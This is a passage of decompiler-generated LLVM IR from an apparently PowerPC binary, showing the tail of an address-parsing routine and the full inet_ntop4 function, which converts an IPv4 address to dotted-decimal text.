  %v3_10013810 = icmp eq i32 %v0_10013810, 0
  br i1 %v3_10013810, label %dec_label_pc_10013818, label %dec_label_pc_1001382c

dec_label_pc_10013818:                            ; preds = %dec_label_pc_10013810
  %v0_10013818 = load i32, i32* @r24, align 4
  %v3_10013818 = icmp eq i32 %v0_10013818, 0
  br i1 %v3_10013818, label %dec_label_pc_10013820, label %dec_label_pc_10013944

dec_label_pc_10013820:                            ; preds = %dec_label_pc_10013818
  %v0_10013820 = load i32, i32* @r31, align 4
  store i32 %v0_10013820, i32* @r24, align 4
  %v0_10013824 = load i32, i32* @r29, align 4
  store i32 %v0_10013824, i32* @r26, align 4
  br label %dec_label_pc_10013898.backedge

dec_label_pc_1001382c:                            ; preds = %dec_label_pc_10013810
  %v0_1001382c = load i32, i32* @r29, align 4
  %v1_1001382c = inttoptr i32 %v0_1001382c to i8*
  %v2_1001382c = load i8, i8* %v1_1001382c, align 1
  %v3_1001382c = zext i8 %v2_1001382c to i32
  store i32 %v3_1001382c, i32* %r0.global-to-local, align 4
  %v3_10013830 = icmp eq i8 %v2_1001382c, 0
  br i1 %v3_10013830, label %dec_label_pc_10013944, label %dec_label_pc_10013838

dec_label_pc_10013838:                            ; preds = %dec_label_pc_1001382c
  %v0_10013838 = load i32, i32* @r31, align 4
  %v1_10013838 = add i32 %v0_10013838, 2
  store i32 %v1_10013838, i32* %r0.global-to-local, align 4
  %v1_1001383c = load i32, i32* @r27, align 4
  %v3_1001383c = icmp ugt i32 %v1_10013838, %v1_1001383c
  br i1 %v3_1001383c, label %dec_label_pc_10013944, label %dec_label_pc_10013844

dec_label_pc_10013844:                            ; preds = %dec_label_pc_10013838
  %v0_10013844 = load i32, i32* @r28, align 4
  %v1_10013844 = udiv i32 %v0_10013844, 256
  store i32 %v1_10013844, i32* %r0.global-to-local, align 4
  %v1_10013848 = trunc i32 %v0_10013844 to i8
  %v3_10013848 = add i32 %v0_10013838, 1
  %v4_10013848 = inttoptr i32 %v3_10013848 to i8*
  store i8 %v1_10013848, i8* %v4_10013848, align 1
  %v0_1001384c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001384c = trunc i32 %v0_1001384c to i8
  %v2_1001384c = load i32, i32* @r31, align 4
  %v3_1001384c = inttoptr i32 %v2_1001384c to i8*
  store i8 %v1_1001384c, i8* %v3_1001384c, align 1
  %v0_10013850 = load i32, i32* @r29, align 4
  store i32 %v0_10013850, i32* @r26, align 4
  %v0_10013854 = load i32, i32* @r31, align 4
  %v1_10013854 = add i32 %v0_10013854, 2
  store i32 %v1_10013854, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001389830 = inttoptr i32 %v0_10013850 to i8*
  %v2_1001389831 = load i8, i8* %v1_1001389830, align 1
  %v3_1001389832 = zext i8 %v2_1001389831 to i32
  store i32 %v3_1001389832, i32* %r3.global-to-local, align 4
  store i32 268515488, i32* @lr, align 4
  %v1_1001389c33 = call i32 @__GI_tolower(i32 %v3_1001389832)
  store i32 %v1_1001389c33, i32* %r3.global-to-local, align 4
  store i32 %v1_1001389c33, i32* @r30, align 4
  %v3_100138a034 = icmp eq i32 %v1_1001389c33, 0
  br i1 %v3_100138a034, label %dec_label_pc_100138a8, label %dec_label_pc_100137d0.lr.ph

dec_label_pc_100137d0.lr.ph:                      ; preds = %dec_label_pc_100137c4, %dec_label_pc_10013844
  %v1_1001389c3341 = phi i32 [ %v1_1001389c33, %dec_label_pc_10013844 ], [ %v1_1001389c3339, %dec_label_pc_100137c4 ]
  br label %dec_label_pc_100137d0

dec_label_pc_10013864:                            ; preds = %dec_label_pc_10013808
  %v3_10013864 = icmp eq i32 %v0_10013808, 46
  br i1 %v3_10013864, label %dec_label_pc_1001386c, label %dec_label_pc_10013944

dec_label_pc_1001386c:                            ; preds = %dec_label_pc_10013864
  %v0_1001386c = load i32, i32* @r31, align 4
  %v1_1001386c = add i32 %v0_1001386c, 4
  store i32 %v1_1001386c, i32* @r30, align 4
  %v1_10013870 = load i32, i32* @r27, align 4
  %v3_10013870 = icmp ugt i32 %v1_1001386c, %v1_10013870
  br i1 %v3_10013870, label %dec_label_pc_10013944, label %dec_label_pc_10013878

dec_label_pc_10013878:                            ; preds = %dec_label_pc_1001386c
  %v0_1001387c = load i32, i32* @r26, align 4
  store i32 %v0_1001387c, i32* %r3.global-to-local, align 4
  store i32 268515460, i32* @lr, align 4
  %v3_10013880 = call i32 @inet_pton4(i32 %v0_1001387c, i32 %v0_1001386c)
  store i32 %v3_10013880, i32* %r3.global-to-local, align 4
  %v0_10013884 = load i32, i32* @r30, align 4
  store i32 %v0_10013884, i32* @r31, align 4
  %v2_10013888 = icmp sgt i32 %v3_10013880, 0
  br i1 %v2_10013888, label %dec_label_pc_100138cc, label %dec_label_pc_10013944

dec_label_pc_10013894:                            ; preds = %dec_label_pc_100137f0
  store i32 1, i32* @r23, align 4
  %v0_10013898.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10013898.backedge

dec_label_pc_10013898.backedge:                   ; preds = %dec_label_pc_10013894, %dec_label_pc_10013820
  %v0_10013898.be = phi i32 [ %v0_10013898.pre.pre, %dec_label_pc_10013894 ], [ %v0_10013824, %dec_label_pc_10013820 ]
  %v1_10013898 = inttoptr i32 %v0_10013898.be to i8*
  %v2_10013898 = load i8, i8* %v1_10013898, align 1
  %v3_10013898 = zext i8 %v2_10013898 to i32
  store i32 %v3_10013898, i32* %r3.global-to-local, align 4
  store i32 268515488, i32* @lr, align 4
  %v1_1001389c = call i32 @__GI_tolower(i32 %v3_10013898)
  store i32 %v1_1001389c, i32* %r3.global-to-local, align 4
  store i32 %v1_1001389c, i32* @r30, align 4
  %v3_100138a0 = icmp eq i32 %v1_1001389c, 0
  br i1 %v3_100138a0, label %dec_label_pc_100138a8, label %dec_label_pc_100137d0

dec_label_pc_100138a8:                            ; preds = %dec_label_pc_10013898.backedge, %dec_label_pc_100137c4, %dec_label_pc_10013844
  %v0_100138a8 = load i32, i32* @r23, align 4
  %v3_100138a8 = icmp eq i32 %v0_100138a8, 0
  %v0_10013910.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_100138a8, label %dec_label_pc_100138cc, label %dec_label_pc_100138b0

dec_label_pc_100138b0:                            ; preds = %dec_label_pc_100138a8
  %v1_100138b0 = add i32 %v0_10013910.pre.pre, 2
  store i32 %v1_100138b0, i32* %r0.global-to-local, align 4
  %v1_100138b4 = load i32, i32* @r27, align 4
  %v3_100138b4 = icmp ugt i32 %v1_100138b0, %v1_100138b4
  br i1 %v3_100138b4, label %dec_label_pc_10013944, label %dec_label_pc_100138bc

dec_label_pc_100138bc:                            ; preds = %dec_label_pc_100138b0
  %v0_100138bc = load i32, i32* @r28, align 4
  %v1_100138bc = udiv i32 %v0_100138bc, 256
  store i32 %v1_100138bc, i32* %r0.global-to-local, align 4
  %v1_100138c0 = trunc i32 %v0_100138bc to i8
  %v3_100138c0 = add i32 %v0_10013910.pre.pre, 1
  %v4_100138c0 = inttoptr i32 %v3_100138c0 to i8*
  store i8 %v1_100138c0, i8* %v4_100138c0, align 1
  %v0_100138c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100138c4 = trunc i32 %v0_100138c4 to i8
  %v2_100138c4 = load i32, i32* @r31, align 4
  %v3_100138c4 = inttoptr i32 %v2_100138c4 to i8*
  store i8 %v1_100138c4, i8* %v3_100138c4, align 1
  %v0_100138c8 = load i32, i32* @r31, align 4
  %v1_100138c8 = add i32 %v0_100138c8, 2
  store i32 %v1_100138c8, i32* @r31, align 4
  br label %dec_label_pc_100138cc

dec_label_pc_100138cc:                            ; preds = %dec_label_pc_100138a8, %dec_label_pc_10013878, %dec_label_pc_100138bc
  %v0_10013910.pre = phi i32 [ %v0_10013884, %dec_label_pc_10013878 ], [ %v1_100138c8, %dec_label_pc_100138bc ], [ %v0_10013910.pre.pre, %dec_label_pc_100138a8 ]
  %v0_100138cc = load i32, i32* @r24, align 4
  %v3_100138cc = icmp eq i32 %v0_100138cc, 0
  %v1_10013910.pre = load i32, i32* @r27, align 4
  %v4_10013910 = icmp eq i32 %v0_10013910.pre, %v1_10013910.pre
  br i1 %v3_100138cc, label %dec_label_pc_10013910, label %dec_label_pc_100138d4

dec_label_pc_100138d4:                            ; preds = %dec_label_pc_100138cc
  %v2_100138d8 = sub i32 %v0_10013910.pre, %v0_100138cc
  store i32 %v2_100138d8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_10013910, label %dec_label_pc_10013944, label %dec_label_pc_100138f8.preheader

dec_label_pc_100138f8.preheader:                  ; preds = %dec_label_pc_100138d4
  %v3_100138f824 = icmp slt i32 %v2_100138d8, 1
  %v2_100138fc26 = add i32 %v2_100138d8, -1
  store i32 %v2_100138fc26, i32* %r10.global-to-local, align 4
  %v2_1001390027 = add i32 %v1_10013910.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_100138f824, label %dec_label_pc_10013910.thread, label %dec_label_pc_100138ec

dec_label_pc_100138ec:                            ; preds = %dec_label_pc_100138f8.preheader, %dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge
  %v0_100138ec = phi i32 [ %v0_100138ec.pre, %dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge ], [ %v0_100138cc, %dec_label_pc_100138f8.preheader ]
  %v2_1001390029 = phi i32 [ %v2_10013900, %dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge ], [ %v2_1001390027, %dec_label_pc_100138f8.preheader ]
  %v2_100138fc28 = phi i32 [ %v2_100138fc, %dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge ], [ %v2_100138fc26, %dec_label_pc_100138f8.preheader ]
  %v2_100138ec = add i32 %v0_100138ec, %v2_100138fc28
  %v3_100138ec = inttoptr i32 %v2_100138ec to i8*
  %v4_100138ec = load i8, i8* %v3_100138ec, align 1
  %v5_100138ec = zext i8 %v4_100138ec to i32
  store i32 %v5_100138ec, i32* %r0.global-to-local, align 4
  %v3_100138f0 = inttoptr i32 %v2_1001390029 to i8*
  store i8 %v4_100138ec, i8* %v3_100138f0, align 1
  %v0_100138f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_100138f4 = load i32, i32* @r24, align 4
  %v2_100138f4 = load i32, i32* %r10.global-to-local, align 4
  %v3_100138f4 = trunc i32 %v0_100138f4 to i8
  %v4_100138f4 = add i32 %v2_100138f4, %v1_100138f4
  %v5_100138f4 = inttoptr i32 %v4_100138f4 to i8*
  store i8 %v3_100138f4, i8* %v5_100138f4, align 1
  %v0_100138f8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_100138f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10013900.pre = load i32, i32* @r27, align 4
  %v3_100138f8 = icmp slt i32 %v1_100138f8.pre, %v0_100138f8.pre
  %v2_100138fc = sub i32 %v1_100138f8.pre, %v0_100138f8.pre
  store i32 %v2_100138fc, i32* %r10.global-to-local, align 4
  %v1_10013904 = add i32 %v0_100138f8.pre, 1
  store i32 %v1_10013904, i32* %r9.global-to-local, align 4
  br i1 %v3_100138f8, label %dec_label_pc_10013910.thread, label %dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge

dec_label_pc_100138ec.dec_label_pc_100138ec_crit_edge: ; preds = %dec_label_pc_100138ec
  %v2_10013900 = sub i32 %v1_10013900.pre, %v0_100138f8.pre
  %v0_100138ec.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_100138ec

dec_label_pc_10013910.thread:                     ; preds = %dec_label_pc_100138ec, %dec_label_pc_100138f8.preheader
  %v0_1001390c.lcssa = phi i32 [ %v1_10013910.pre, %dec_label_pc_100138f8.preheader ], [ %v1_10013900.pre, %dec_label_pc_100138ec ]
  store i32 %v0_1001390c.lcssa, i32* @r31, align 4
  br label %dec_label_pc_10013918

dec_label_pc_10013910:                            ; preds = %dec_label_pc_100138cc
  br i1 %v4_10013910, label %dec_label_pc_10013918, label %dec_label_pc_10013944

dec_label_pc_10013918:                            ; preds = %dec_label_pc_10013910.thread, %dec_label_pc_10013910
  %v0_10013918 = load i32, i32* @r22, align 4
  store i32 %v0_10013918, i32* @r3, align 4
  store i32 %v2_10013794, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013928.710 to i32), i32* @lr, align 4
  %v0_10013924 = call i32 @memcpy()
  store i32 %v0_10013924, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013948

dec_label_pc_10013930:                            ; preds = %dec_label_pc_10013774
  %v0_10013930 = call i32 @__errno_location()
  store i32 %v0_10013930, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001393c = inttoptr i32 %v0_10013930 to i32*
  store i32 97, i32* %v2_1001393c, align 4
  %v0_1001394c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013948

dec_label_pc_10013944:                            ; preds = %dec_label_pc_10013838, %dec_label_pc_1001382c, %dec_label_pc_100137f0, %dec_label_pc_10013818, %dec_label_pc_100138d4, %dec_label_pc_10013878, %dec_label_pc_10013864, %dec_label_pc_10013910, %dec_label_pc_100137b8, %dec_label_pc_100138b0, %dec_label_pc_1001386c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013948

dec_label_pc_10013948:                            ; preds = %dec_label_pc_10013930, %dec_label_pc_10013918, %dec_label_pc_10013780, %dec_label_pc_10013944
  %v0_1001394c = phi i32 [ %v0_1001394c.pre, %dec_label_pc_10013930 ], [ 1, %dec_label_pc_10013918 ], [ %v3_10013788, %dec_label_pc_10013780 ], [ 0, %dec_label_pc_10013944 ]
  store i32 %v0_10013758, i32* %r0.global-to-local, align 4
  store i32 %v0_1001394c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001394c

; uselistorder directives
  uselistorder i32 %v0_1001394c, { 1, 0 }
  uselistorder i32 %v2_100138fc, { 1, 0 }
  uselistorder i32 %v0_100138f8.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10013910, { 1, 0 }
  uselistorder i32 %v0_10013910.pre, { 1, 0 }
  uselistorder i32 %v0_100138bc, { 1, 0 }
  uselistorder i32 %v0_10013910.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001389c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10013844, { 1, 0 }
  uselistorder i32 %v1_100137f4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 9, 10, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 16, 15, 8, 18, 17, 11, 12, 13, 14, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268515488, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10013948, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013944, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10013918, { 1, 0 }
  uselistorder label %dec_label_pc_100138ec, { 1, 0 }
  uselistorder label %dec_label_pc_100138cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100138a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100137d0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_100137d0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100139b8.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10013960 = load i32, i32* @lr, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1001398c = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1001398c, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1001399c.713 to i32), i32* @lr, align 4
  %v3_10013998 = call i32 @__GI_memset(i32 %v2_1001398c, i32 0, i32 15)
  store i32 %v3_10013998, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_10013a5c2 = load i32, i32* @r1, align 4
  store i32 %v0_10013a5c2, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100139b8

dec_label_pc_100139b8:                            ; preds = %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge, %dec_label_pc_100139b8.lr.ph
  %v2_100139d8 = phi i32 [ %v2_10013a5c, %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge ], [ %v0_10013a5c2, %dec_label_pc_100139b8.lr.ph ]
  %v0_100139cc = phi i32 [ %v0_10013a5c, %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge ], [ %v0_10013a5c2, %dec_label_pc_100139b8.lr.ph ]
  %v0_100139bc = phi i32 [ %v1_10013a5c, %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge ], [ 0, %dec_label_pc_100139b8.lr.ph ]
  %v1_100139c4 = phi i32 [ %v1_100139b8.pre, %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge ], [ 0, %dec_label_pc_100139b8.lr.ph ]
  %v0_100139b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100139b8 = add i32 %v0_100139b8, %v1_100139c4
  %v3_100139b8 = inttoptr i32 %v2_100139b8 to i8*
  %v4_100139b8 = load i8, i8* %v3_100139b8, align 1
  %v5_100139b8 = zext i8 %v4_100139b8 to i32
  store i32 %v5_100139b8, i32* %r10.global-to-local, align 4
  store i32 %v0_100139bc, i32* %r8.global-to-local, align 4
  %v1_100139c0 = add i32 %v0_100139bc, 1
  store i32 %v1_100139c0, i32* %r11.global-to-local, align 4
  store i32 %v2_100139b8, i32* %r3.global-to-local, align 4
  %v1_100139c8 = load i32, i32* @r28, align 4
  %v2_100139c8 = udiv i32 %v5_100139b8, %v1_100139c8
  %v2_100139cc = add i32 %v1_100139c0, %v0_100139cc
  store i32 %v2_100139cc, i32* %r6.global-to-local, align 4
  %v1_100139d0 = add nuw nsw i32 %v2_100139c8, 48
  %v1_100139d4 = urem i32 %v1_100139d0, 256
  store i32 %v1_100139d4, i32* %r0.global-to-local, align 4
  %v1_100139d8 = trunc i32 %v1_100139d0 to i8
  %v3_100139d8 = add i32 %v2_100139d8, 8
  %v4_100139d8 = inttoptr i32 %v3_100139d8 to i8*
  store i8 %v1_100139d8, i8* %v4_100139d8, align 1
  %v0_100139dc = load i32, i32* %r0.global-to-local, align 4
  %v3_100139dc = icmp eq i32 %v0_100139dc, 48
  %v0_100139e4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100139e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100139e4 = udiv i32 %v0_100139e4, %v1_100139e4
  store i32 %v2_100139e4, i32* %r9.global-to-local, align 4
  br i1 %v3_100139dc, label %dec_label_pc_100139e4, label %dec_label_pc_10013a10

dec_label_pc_100139e4:                            ; preds = %dec_label_pc_100139b8
  %v2_100139e8 = udiv i32 %v2_100139e4, %v1_100139e4
  %tmp18 = mul i32 %v2_100139e8, -10
  %v2_100139f0 = add i32 %v2_100139e4, 48
  %v1_100139f4 = add i32 %v2_100139f0, %tmp18
  store i32 %v1_100139f4, i32* %r9.global-to-local, align 4
  %v1_100139f8 = urem i32 %v1_100139f4, 256
  store i32 %v1_100139f8, i32* %r0.global-to-local, align 4
  %v1_100139fc = trunc i32 %v1_100139f4 to i8
  %v2_100139fc = load i32, i32* %r7.global-to-local, align 4
  %v3_100139fc = add i32 %v2_100139fc, 8
  %v4_100139fc = inttoptr i32 %v3_100139fc to i8*
  store i8 %v1_100139fc, i8* %v4_100139fc, align 1
  %v0_10013a00 = load i32, i32* %r0.global-to-local, align 4
  %v3_10013a00 = icmp eq i32 %v0_10013a00, 48
  br i1 %v3_10013a00, label %dec_label_pc_10013a2c, label %dec_label_pc_10013a08

dec_label_pc_10013a08:                            ; preds = %dec_label_pc_100139e4
  %v0_10013a08 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10013a08, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10013a2c

dec_label_pc_10013a10:                            ; preds = %dec_label_pc_100139b8
  %v0_10013a14 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013a14 = add i32 %v0_10013a14, 1
  store i32 %v1_10013a14, i32* %r8.global-to-local, align 4
  %v2_10013a18 = udiv i32 %v2_100139e4, %v1_100139e4
  %v1_10013a1c = mul i32 %v2_10013a18, 10
  store i32 %v1_10013a1c, i32* %r0.global-to-local, align 4
  %v2_10013a20 = sub i32 %v2_100139e4, %v1_10013a1c
  %v1_10013a24 = add i32 %v2_10013a20, 48
  store i32 %v1_10013a24, i32* %r9.global-to-local, align 4
  %v1_10013a28 = trunc i32 %v1_10013a24 to i8
  %v2_10013a28 = load i32, i32* %r6.global-to-local, align 4
  %v3_10013a28 = add i32 %v2_10013a28, 8
  %v4_10013a28 = inttoptr i32 %v3_10013a28 to i8*
  store i8 %v1_10013a28, i8* %v4_10013a28, align 1
  br label %dec_label_pc_10013a2c

dec_label_pc_10013a2c:                            ; preds = %dec_label_pc_100139e4, %dec_label_pc_10013a08, %dec_label_pc_10013a10
  %v0_10013a2c = load i32, i32* %r3.global-to-local, align 4
  %v1_10013a2c = inttoptr i32 %v0_10013a2c to i8*
  %v2_10013a2c = load i8, i8* %v1_10013a2c, align 1
  %v3_10013a2c = zext i8 %v2_10013a2c to i32
  %v0_10013a30 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013a30 = add i32 %v0_10013a30, 1
  %v0_10013a34 = load i32, i32* @r1, align 4
  %v2_10013a34 = add i32 %v0_10013a34, %v0_10013a30
  store i32 %v2_10013a34, i32* %r10.global-to-local, align 4
  %v2_10013a38 = add i32 %v1_10013a30, %v0_10013a34
  store i32 %v2_10013a38, i32* %r8.global-to-local, align 4
  %v1_10013a3c = load i32, i32* %r5.global-to-local, align 4
  %v2_10013a3c = udiv i32 %v3_10013a2c, %v1_10013a3c
  %v1_10013a40 = add i32 %v0_10013a30, 2
  store i32 %v1_10013a40, i32* %r11.global-to-local, align 4
  %v0_10013a44 = load i32, i32* %r4.global-to-local, align 4
  %v1_10013a44 = add i32 %v0_10013a44, 1
  store i32 %v1_10013a44, i32* %r4.global-to-local, align 4
  %v1_10013a48 = mul nuw nsw i32 %v2_10013a3c, 10
  store i32 %v1_10013a48, i32* %r0.global-to-local, align 4
  %v2_10013a4c = sub nsw i32 %v3_10013a2c, %v1_10013a48
  %v1_10013a50 = add nsw i32 %v2_10013a4c, 48
  store i32 %v1_10013a50, i32* %r9.global-to-local, align 4
  %v1_10013a54 = trunc i32 %v1_10013a50 to i8
  %v3_10013a54 = add i32 %v2_10013a34, 8
  %v4_10013a54 = inttoptr i32 %v3_10013a54 to i8*
  store i8 %v1_10013a54, i8* %v4_10013a54, align 1
  %v0_10013a58 = load i32, i32* %r12.global-to-local, align 4
  %v1_10013a58 = trunc i32 %v0_10013a58 to i8
  %v2_10013a58 = load i32, i32* %r8.global-to-local, align 4
  %v3_10013a58 = add i32 %v2_10013a58, 8
  %v4_10013a58 = inttoptr i32 %v3_10013a58 to i8*
  store i8 %v1_10013a58, i8* %v4_10013a58, align 1
  %v0_10013a5c = load i32, i32* @r1, align 4
  %v1_10013a5c = load i32, i32* %r11.global-to-local, align 4
  %v2_10013a5c = add i32 %v1_10013a5c, %v0_10013a5c
  store i32 %v2_10013a5c, i32* %r7.global-to-local, align 4
  %v0_10013a60 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013a60 = add i32 %v0_10013a60, -1
  store i32 %v1_10013a60, i32* %ctr.global-to-local, align 4
  %v2_10013a60 = icmp eq i32 %v1_10013a60, 0
  br i1 %v2_10013a60, label %dec_label_pc_10013a64, label %dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge

dec_label_pc_10013a2c.dec_label_pc_100139b8_crit_edge: ; preds = %dec_label_pc_10013a2c
  %v1_100139b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100139b8

dec_label_pc_10013a64:                            ; preds = %dec_label_pc_10013a2c
  %v2_10013a64 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10013a64, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013a6c = add i32 %v1_10013a5c, %v2_10013a64
  store i32 %v2_10013a6c, i32* %r9.global-to-local, align 4
  store i32 %v2_10013a64, i32* @r3, align 4
  %v3_10013a74 = add i32 %v2_10013a6c, -1
  %v4_10013a74 = inttoptr i32 %v3_10013a74 to i8*
  store i8 0, i8* %v4_10013a74, align 1
  %v0_10013a78 = call i32 @__GI_strlen()
  store i32 %v0_10013a78, i32* %r3.global-to-local, align 4
  %v1_10013a7c = load i32, i32* @r30, align 4
  %v3_10013a7c = icmp ugt i32 %v0_10013a78, %v1_10013a7c
  br i1 %v3_10013a7c, label %dec_label_pc_10013a84, label %dec_label_pc_10013a98

dec_label_pc_10013a84:                            ; preds = %dec_label_pc_10013a64
  %v0_10013a84 = call i32 @__errno_location()
  store i32 %v0_10013a84, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10013a90 = inttoptr i32 %v0_10013a84 to i32*
  store i32 28, i32* %v2_10013a90, align 4
  %v0_10013aac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013aa8

dec_label_pc_10013a98:                            ; preds = %dec_label_pc_10013a64
  %v0_10013a98 = load i32, i32* @r29, align 4
  store i32 %v0_10013a98, i32* %r3.global-to-local, align 4
  store i32 %v2_10013a64, i32* %r4.global-to-local, align 4
  %v2_10013aa0 = bitcast i16* %stack_var_-56 to i8*
  %v3_10013aa0 = call i32 @strcpy(i32 %v0_10013a98, i8* %v2_10013aa0)
  store i32 %v3_10013aa0, i32* %r3.global-to-local, align 4
  store i32 %v3_10013aa0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013aa8

dec_label_pc_10013aa8:                            ; preds = %dec_label_pc_10013a84, %dec_label_pc_10013a98
  %v0_10013aac = phi i32 [ %v0_10013aac.pre, %dec_label_pc_10013a84 ], [ %v3_10013aa0, %dec_label_pc_10013a98 ]
  store i32 %v0_10013960, i32* %r0.global-to-local, align 4
  store i32 %v0_10013aac, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013aac

; uselistorder directives
  uselistorder i32 %v0_10013aac, { 1, 0 }
  uselistorder i32 %v2_10013a64, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10013a60, { 1, 0 }
  uselistorder i32 %v2_10013a5c, { 1, 0 }
  uselistorder i32 %v0_10013a30, { 1, 0, 2 }
  uselistorder i32 %v1_100139f4, { 1, 0, 2 }
  uselistorder i32 %v2_100139e4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_100139d0, { 1, 0 }
  uselistorder i32 %v0_100139bc, { 1, 0 }
  uselistorder i32 %v0_10013a5c2, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 15, { 0, 3, 1, 8, 9, 4, 5, 6, 2, 7 }
  uselistorder i32 268500992, { 38, 44, 40, 39, 45, 0, 41, 42, 5, 6, 7, 8, 9, 10, 11, 4, 12, 2, 1, 13, 17, 16, 18, 19, 15, 20, 14, 21, 22, 23, 24, 25, 26, 27, 3, 28, 29, 30, 31, 32, 33, 34, 43, 35, 36, 37 }
